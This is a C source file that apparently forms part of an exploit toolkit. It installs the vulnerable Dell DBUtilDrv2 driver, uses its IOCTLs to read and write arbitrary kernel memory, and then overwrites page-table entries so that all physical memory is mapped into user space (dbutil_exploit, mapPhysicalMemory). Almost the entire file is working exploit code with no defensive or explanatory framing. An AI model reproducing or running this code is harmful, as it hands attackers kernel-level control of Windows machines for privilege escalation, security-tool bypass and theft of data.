#include "dbutil.h"
#include "scmDriver.h"
#include "kinfo.h"
#include "macro.h"
#include <stdio.h>
#include <newdev.h>

// ref: https://github.com/jbaines-r7/dellicious/

#define DBUTIL2_DRV L"DBUtilDrv2"
#define DBUTIL2_DEVICE_PATH L"\\\\.\\DBUtil_2_5"

// driver filenames in current directory
#define DRIVER_FILENAME L"DBUtilDrv2.sys"
#define DRIVER_INF L"dbutildrv2.inf"


#define IOCTL_VIRTUAL_READ			0x9b0c1ec4
#define IOCTL_VIRTUAL_WRITE			0x9b0c1ec8

typedef struct _DBUTIL_VIRT_DATA {
	UINT64 Ignored;
	UINT64 TargetAddress; // src for read, dst for write
	UINT64 Offset;
	//UINT8 Buffer[0]; // number of byte for read/write is calculated from Buffer size
} DBUTIL_VIRT_DATA, *PDBUTIL_VIRT_DATA;

GUID guid;
HDEVINFO hDevInfo = INVALID_HANDLE_VALUE;
SP_DEVINFO_DATA deviceInfoData;
HANDLE hDevice;

#define DBUTIL_HWID        L"ROOT\\" DBUTIL2_DRV
#define DBUTIL_INSTANCEID  L"ROOT\\DELLUTILS\\0000"
BOOL dbutil_addDevice(WCHAR *infPath)
{
	if (hDevInfo != INVALID_HANDLE_VALUE) {
		return TRUE;
	}

#define MAX_CLASS_NAME_LEN 32
	WCHAR classname[MAX_CLASS_NAME_LEN] = { 0 };
	if (!SetupDiGetINFClassW(infPath, &guid, classname, MAX_CLASS_NAME_LEN, NULL)) {
		printf("[-] SetupDiGetINFClassA failed: 0x%x\n", GetLastError());
		return FALSE;
	}

	HDEVINFO devInfo = SetupDiGetClassDevsW(&guid, NULL, NULL, DIGCF_PRESENT);
	if (INVALID_HANDLE_VALUE != devInfo) {
		deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);

		WCHAR buf[64];
		DWORD size = 64;
		DWORD i = 0;
		BOOL found = FALSE;
		while (SetupDiEnumDeviceInfo(devInfo, i, &deviceInfoData)) {
			if (SetupDiGetDeviceRegistryPropertyW(devInfo, &deviceInfoData, SPDRP_HARDWAREID, NULL, (BYTE*)&buf, sizeof(buf), &size)) {
				if (wcscmp(buf, DBUTIL_HWID) == 0) {
					found = TRUE;
				}
			}
			else {
				printf("[-] SetupDiGetDeviceRegistryPropertyW failed: 0x%x\n", GetLastError());
			}
			i++;
		}

		if (found && i == 1) {
			// already installed
			hDevInfo = devInfo;
			return TRUE;
		}

		SetupDiDestroyDeviceInfoList(devInfo);
	}

	devInfo = SetupDiCreateDeviceInfoList(&guid, NULL);
	if (INVALID_HANDLE_VALUE == devInfo) {
		printf("[-] SetupDiCreateDeviceInfoList failed: 0x%x\n", GetLastError());
		return FALSE;
	}

	deviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
	if (!SetupDiCreateDeviceInfoW(devInfo, classname, &guid, NULL, NULL, 1, &deviceInfoData)) {
		printf("[-] SetupDiCreateDeviceInfoList failed: 0x%x\n", GetLastError());
		return FALSE;
	}

	if (!SetupDiSetDeviceRegistryPropertyW(devInfo, &deviceInfoData, SPDRP_HARDWAREID, (BYTE*)DBUTIL_HWID, (DWORD)sizeof(DBUTIL_HWID))) {
		printf("[-] SetupDiSetDeviceRegistryPropertyA failed: 0x%x\n", GetLastError());
		return FALSE;
	}

	if (!SetupDiCallClassInstaller(DIF_REGISTERDEVICE, devInfo, &deviceInfoData)) {
		printf("[-] SetupDiCallClassInstaller failed: 0x%x", GetLastError());
		return FALSE;
	}

	BOOL restart = 0;
	if (!UpdateDriverForPlugAndPlayDevicesW(NULL, DBUTIL_HWID, infPath, INSTALLFLAG_FORCE | INSTALLFLAG_NONINTERACTIVE, &restart)) {
		printf("[-] UpdateDriverForPlugAndPlayDevicesW failed: 0x%x\n", GetLastError());
		return FALSE;
	}

	hDevInfo = devInfo;

	return TRUE;
}

void dbutil_removeDevice()
{
	if (hDevInfo != INVALID_HANDLE_VALUE) {
		SetupDiRemoveDevice(hDevInfo, &deviceInfoData);
		SetupDiDestroyDeviceInfoList(hDevInfo);
		hDevInfo = INVALID_HANDLE_VALUE;
	}
}

static void GetDriverPath(WCHAR szPath[MAX_PATH])
{
	GetModuleFileNameW(NULL, szPath, MAX_PATH);
	WCHAR* ptr = wcsrchr(szPath, L'\\');
	ptr++;
	wcscpy_s(ptr, MAX_PATH - (ptr - szPath), DRIVER_FILENAME);
}

static void GetInfPath(WCHAR szPath[MAX_PATH])
{
	GetModuleFileNameW(NULL, szPath, MAX_PATH);
	WCHAR* ptr = wcsrchr(szPath, L'\\');
	ptr++;
	wcscpy_s(ptr, MAX_PATH - (ptr - szPath), DRIVER_INF);
}

BOOL dbutil_startDriver()
{
	WCHAR szFileName[MAX_PATH];

	GetInfPath(szFileName);
	return dbutil_addDevice(szFileName);
}

HANDLE dbutil_loadDevice()
{
	if (hDevice == NULL) {
		if (!dbutil_startDriver()) {
			return NULL;
		}

		hDevice = CreateFile(DBUTIL2_DEVICE_PATH, GENERIC_READ | GENERIC_WRITE,
			0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hDevice == INVALID_HANDLE_VALUE) {
			printf("[-] Cannot open dbutil device, error: %d\n", GetLastError());
			dbutil_removeDevice();
			return FALSE;
		}
	}
	return hDevice;
}

void dbutil_unloadDevice()
{
	if (hDevice != NULL) {
		CloseHandle(hDevice);
		hDevice = NULL;
	}
	dbutil_removeDevice();
	scmUnloadDeviceDriver(DBUTIL2_DRV);
}

// Reads VIRTUAL memory at the given address
BOOL dbutil_read(_In_ HANDLE hDevice, _In_ DWORD64 address, _Out_ void* buffer, _In_ size_t bytesToRead)
{
	DWORD packetSize = (DWORD)(sizeof(DBUTIL_VIRT_DATA) + bytesToRead);
	PDBUTIL_VIRT_DATA pkt = (PDBUTIL_VIRT_DATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, packetSize);
	pkt->TargetAddress = address;

	DWORD bytesReturned = 0;
	BOOL res = DeviceIoControl(hDevice, IOCTL_VIRTUAL_READ, pkt, packetSize, pkt, packetSize, &bytesReturned, NULL);
	if (!res) {
		printf("[-] DeviceIoControl failed, 0x%x\n", GetLastError());
	}
	// Copies the returned value to the output buffer
	memcpy(buffer, &pkt[1], bytesToRead);

	HeapFree(GetProcessHeap(), 0, pkt);

	return res;
}

// Write VIRTUAL memory at the given address
BOOL dbutil_write(_In_ HANDLE hDevice, _In_ DWORD64 address, _In_ void* buffer, _In_ size_t bytesToWrite)
{
	DWORD packetSize = (DWORD)(sizeof(DBUTIL_VIRT_DATA) + bytesToWrite);
	PDBUTIL_VIRT_DATA pkt = (PDBUTIL_VIRT_DATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, packetSize);
	pkt->TargetAddress = address;
	memcpy(&pkt[1], buffer, bytesToWrite);

	DWORD bytesReturned = 0;
	BOOL res = DeviceIoControl(hDevice, IOCTL_VIRTUAL_WRITE, pkt, packetSize, pkt, packetSize, &bytesReturned, NULL);
	if (!res) {
		printf("[-] DeviceIoControl failed, 0x%x\n", GetLastError());
	}
	// Copies the returned value to the output buffer

	HeapFree(GetProcessHeap(), 0, pkt);

	return res;
}

// from nt!MmGetVirtualForPhysical
static ULONG64 Pa2Va(HANDLE hDevice, ULONG64 paBase, ULONG64 pteBase, ULONG64 pa)
{
	ULONG64 paIdx = (pa >> 12) * 6;
	ULONG64 paTableEntryVa = paBase + paIdx * 8;
	ULONG64 val = 0;

	BOOL bres = dbutil_read(hDevice, paTableEntryVa, &val, sizeof(val));
	if (!bres) {
		printf("Pa2Va: Cannot read table at 0x%llx for PA 0x%llx\n", paTableEntryVa, pa);
		exit(1);
	}
	LONG64 va = (val << 0x19) - (pteBase << 0x19);
	va >>= 0x10;
	return (ULONG64)va + (pa & 0xfff);
}

static ULONG64 mapPhysicalMemory(HANDLE hDevice, ULONG64 size, ULONG64 directoryBase, ULONG64 paBase, ULONG64 pteBase)
{
	// Note: MmMapIoSpace cannot map Page Table. We have to convert page table Physical Address to Virtual Address
	//   before using dbutil driver read/write page table entry
	ULONG64 virtualAddress = 0x80000000;

	ULONG64 entry = 0; // MMPTE_HARDWARE
	DWORD idx = PML4_IDX(virtualAddress);
	ULONG64 tableAddr = Pa2Va(hDevice, paBase, pteBase, directoryBase);
	BOOL bres = dbutil_read(hDevice, tableAddr + idx * 8, &entry, sizeof(entry));
	if (!bres) {
		printf("[-] Cannot read directoryBase[0x%x]\n", idx);
		return 0;
	}
	if (entry == 0 || (entry & PRESENT_FLAG) == 0) {
		printf("[-] PML4E is invalid at 0x%x => 0x%llx\n", idx, entry);
		return 0;
	}
	printf("[.]   PML4 idx: 0x%x => 0x%llx\n", idx, entry);

	ULONG64 paddr = TABLE_ENTRY_PA(entry);
	tableAddr = Pa2Va(hDevice, paBase, pteBase, paddr);
	if (tableAddr == 0) {
		printf("[-] Cannot get virtual address of directory L1: 0x%llx\n", paddr);
		return 0;
	}

	DWORD entryCount = (DWORD)(size >> SHIFT_1G) + 2; // extra 2 pages
	idx = PDPT_IDX(virtualAddress);

	if (entryCount + idx >= 512) {
		printf("[-] Physical memory is too large. Too many entry. From idx: 0x%x, count: 0x%x\n", idx, entryCount);
		return 0;
	}

	printf("[+] Writing fake page table to map all physical address. target VA of page table: 0x%llx\n", tableAddr);
	// generating fake PDPTEs (map 1 GB of physical address)
	// PDPTE flags: NX, Page size, Dirty, Access, User, Writable, Present
	ULONG64 entryValue = 0x80000000000000e7;
	ULONG64 fakeEntries[512] = { 0 };
	for (DWORD i = 0; i < entryCount; i++) {
		fakeEntries[i] = entryValue;
		// increment physical address by 1G
		entryValue += (ULONG64)1 << SHIFT_1G;
	}
	if (!dbutil_write(hDevice, tableAddr + idx * 8, fakeEntries, entryCount * 8)) {
		return 0;
	}

	return virtualAddress;
}

BOOL dbutil_exploit(HANDLE hDevice, ULONG64 eprocessVa, ULONG64* pDirectoryBase, ULONG64* pPphysicalMapVa)
{
	ULONG64 totalPhyshicalMemory = 0;
	if (!GetPhysicallyInstalledSystemMemory(&totalPhyshicalMemory)) {
		printf("GetPhysicallyInstalledSystemMemory failed, error code: 0x%x\n", GetLastError());
		return FALSE;
	}
	// TODO: automatically map more when needed
	totalPhyshicalMemory *= 1024; // make it to bytes

	ULONG64 MmGetVirtualForPhysicalVa = findKernelExportVa("MmGetVirtualForPhysical");

	BYTE buffer[32];
	ULONG64 paBase, pteBase;
	if (!dbutil_read(hDevice, MmGetVirtualForPhysicalVa + 0x10, buffer, 32)) {
		printf("Cannot read info from MmGetVirtualForPhysicalVa\n");
		return FALSE;
	}
	memcpy(&paBase, buffer, sizeof(paBase));
	memcpy(&pteBase, buffer + 0x12, sizeof(pteBase));

	ULONG64 directoryBase = 0;
	if (!dbutil_read(hDevice, eprocessVa + 0x28, &directoryBase, sizeof(directoryBase))) {
		printf("Cannot read DirectoryBase from EPROCESS\n");
		return FALSE;
	}
	printf("[+] directoryBase: 0x%llx\n", directoryBase);

	ULONG64 pmap_addr = mapPhysicalMemory(hDevice, totalPhyshicalMemory, directoryBase, paBase, pteBase);

	*pDirectoryBase = directoryBase;
	*pPphysicalMapVa = pmap_addr;

	return pmap_addr != 0;
}
